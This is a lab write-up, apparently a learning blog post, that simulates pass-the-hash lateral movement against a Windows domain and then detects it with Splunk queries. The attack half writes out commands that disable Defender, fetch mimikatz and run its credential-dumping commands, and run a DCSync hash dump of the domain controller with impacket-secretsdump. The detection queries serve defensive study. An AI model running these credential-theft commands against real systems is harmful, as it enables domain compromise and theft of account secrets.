# Attack 3 - Lateral Movement (Pass-the-Hash)

First we must understand what is this attack and how it work.

### Lateral Movement

What is the Lateral Movement?

```jsx
Attack Chain:
Initial Access → Execution → Persistence → Lateral Movement
     ↑                                           ↑
First entering to network                     Network Movement
```

Attacker initial access to network. But usually first machine the compromised machine not target. Real Target:

```jsx
Domain Controller
SQL Server
File Server
Finance Computer
```

Lateral Movement = jump other machine from the first machine

### Scenario

```jsx
Attacker access Windows 11 from Kali (Initial Access)
 ↓
Steal Administrator Hash on the Windows 11
 ↓
Connect DC-01 with stolen hash (Lateral Movement)
 ↓
Domain Controller Compromised

```

### What is the Pass-the-Hash?

Normal Login:

```jsx
User -> Enter password -> convert to hash -> DC verify it
```

Pass-the-Hash:

```jsx
Attacker -> dont know the password
         -> but steal the hash (with mimikatz)
         -> use this hash -> DC confirm it
         -> dont need password
```

Why is this possible? Windows authentication uses the hash in the NTLM protocol in the same way as a password. The hash is equivalent to the password.

### What is the LSASS?

```jsx
LSASS (Local Security Authority Subsystem Service)
→ Windows’ authentication hub
→ Stores the hashes of active users in memory
→ The primary target for attackers

Mimikatz → Reads LSASS’s memory → Extracts the hashes
```

## Step 1 - Hash Dump

#### Way 1 - Hash Dump with mimikatz via Windows 11

```jsx
Mimikatz -> Reads the memory of the LSASS process
         -> Steal the active user hashs
```

First i need to close windows defender on the windows 11 because antivirus detect quickly mimikatz. We on the lab envioranment therefore i can close it

```jsx
# Close Defender
Set-MpPreference -DisableRealtimeMonitoring $true

# Control
Get-MpPreference | Select-Object DisableRealtimeMonitoring
```

And i need to download mimikatz

```jsx
# Download Mimikatz
iwr -Uri "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip" -OutFile "C:\mimikatz.zip"

# Extract Zip
Expand-Archive C:\mimikatz.zip -DestinationPath C:\mimikatz
```

After downloaded mimikatz i need to extract zip and execute mimikatz.exe

```jsx
cd C:\mimikatz\x64
.\mimikatz.exe
```

After enter the mimikatz i need to use some promps to get hashs

```jsx
privilege::debug
sekurlsa::logonpasswords
```

After this prompts i got an error

![image.png](image%20(2).png)

0x00000005 = Access Denied

The 'privilege::debug' permission was insufficient. Windows 11 protect the LSASS

In this situation i need to obfuscte mimikatz, use custom loader, dll injetion, edp bypass techniques but i dont want these i just want to simulate attack therefore i prefer another way for this attack.

#### Way 2 - Hash Dump with impacket via Kali

Enter the KALİ VM and open terminal

```jsx
impacket-secretsdump soclab.local/Administrator:Password@10.10.10.10
```

Im choosing another way for this attack. Im use impacket on the kali linux.

![image.png](image%201%20(2).png)

Why i unsucess on the windows 11?

```jsx
Mimikatz → Attempted to access LSASS from within Windows 11
         → Local process → Defender detects it → blocks it
         → PPL protection → Access to LSASS denied
         → Access Denied (0x00000005)
```

Why i sucess on the Impacket secretsdump

```jsx
Impacket → did not touch LSASS
         → Instead: Read the NTDS.DIT file
```

What is the NTDS.DIT?

On the DC-01 special database file:

Into includes:

→ Domain users hashs

→ Group users

→ All Policies

The Difference Between the Two Methods

Mimikatz (LSASS dump):

- Read from the RAM
- Just online users
- Local process → Defender detecet
- Windows 11 Detected it

Impacket secretdump (NTDS.DIT):

- Read from file
- All domain users
- Through Network
- Enough Administrator privilege
- Defender not detect it

How it do it Impacket?

Impacket → Connected to DC-01 as Administrator
→ Used the "DRSUAPI" protocol
                        ↑
Domain Replication Service API
The protocol used by DCs
to synchronise with one another

Impacket said to the DC:
     "I’m a DC too, give me the hashes"
     DC-01: "Right, here you go" → Provided the contents of NTDS.DIT

## Step 2 - Connect with DC-01 with Pass-the-hash

![image.png](image%202%20(2).png)

Im use Evil-WinRM for to connect DC-01 via terminal. This tool great work for open shell on the target machine.

![image.png](image%203%20(2).png)

We got terminal on the target machine with the pass the hash. Now i can detect this attack via Splunk.

## Step 3 - Detect Lateral Movement on the Splunk

What we search?

```jsx
1. DCSync Attack -> hashdump via secretsdump
   EventCode: 4662 -> Directory Service Address
   
2. Pass-the-Hash  -> Connect with Evil-WinRM
   EventCode: 4624 -> Sucess Login
   Logon Type: 3 -> Network Login
   Auth Packag: NTLM -> Hash-based signature
```

#### Query 1 - Pass-the-Hash Detection

```jsx
index=wineventlog EventCode=4624 Logon_Type=3
| table _time, Account_Name, Workstation_Name, IpAddress, Logon_Type, Authentication_Package
| sort -_time
```

Event Code 4624 = Anyone login success

Logon Type 3 = Login through network

![image.png](image%204%20(2).png)

#### Query 2 - Filter NTLM Authentication

```jsx
index=wineventlog EventCode=4624 Logon_Type=3 Authentication_Package=NTLM
| table _time, Account_Name, IpAddress, Workstation_Name
| sort -_time
```

We used hash not password. Because of this authentication packet did NTLM. Normal users use Kerberberos

![image.png](image%205%20(1).png)

#### Query 3 - DCSync Detection

```jsx
index=wineventlog EventCode=4662
| table _time, Account_Name, Object_Name, Properties
| sort -_time
```

Event Code 4662 = “Anyone access an AD object”

When we execute secretsdump Impacket say to DC-01:

“Im a DC, give me all hashs”

```jsx
Object: cb4e1a98-4e8e-4037-96bf-2dcf984be0b1
     = DS-Replication-Get-Changes-All
     = "Send me all hashs" privilege
```

![image.png](image%206%20(1).png)

Windows logged this event.

#### Visual Summary

![image.png](image%207%20(1).png)

![image.png](image%208%20(1).png)